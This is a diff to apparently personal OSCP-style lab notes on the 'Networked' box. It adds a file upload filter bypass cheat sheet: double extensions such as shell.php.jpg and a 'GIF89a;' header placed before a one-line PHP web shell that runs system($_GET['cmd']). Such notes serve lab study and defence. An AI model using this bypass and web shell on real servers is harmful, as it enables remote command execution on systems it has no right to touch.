@@ -3,6 +3,9 @@ Networked
 Linux box vulnerable to file upload bypass, leading to code execution. 
 Due to improper sanitization, a crontab running as the user can be exploited 
 to achieve command execution
+
+UPLOAD FILTER BYPASS OSCP CHEATSHEET
+GIF Shell.php.gif
 ###############
 
 1-Enummeration:
@@ -38,3 +41,19 @@ to achieve command execution
 
         # from the code on upload.php:
             $validext = array('.jpg', '.png', '.gif', '.jpeg');
+
+    # Bypass File Upload Filtering:
+        We can rename our shell and upload it as shell.php.jpg. 
+        It passed the filter and the file is executed as php.
+
+        If they check the content. Basically you just add the text "GIF89a;" before you shell-code. 
+        So it would look something like this:
+
+            GIF89a;
+            <?
+            system($_GET['cmd']);//or you can insert your complete shell code
+            ?>
+
+
+2-Exploit - Privc Esc:
+
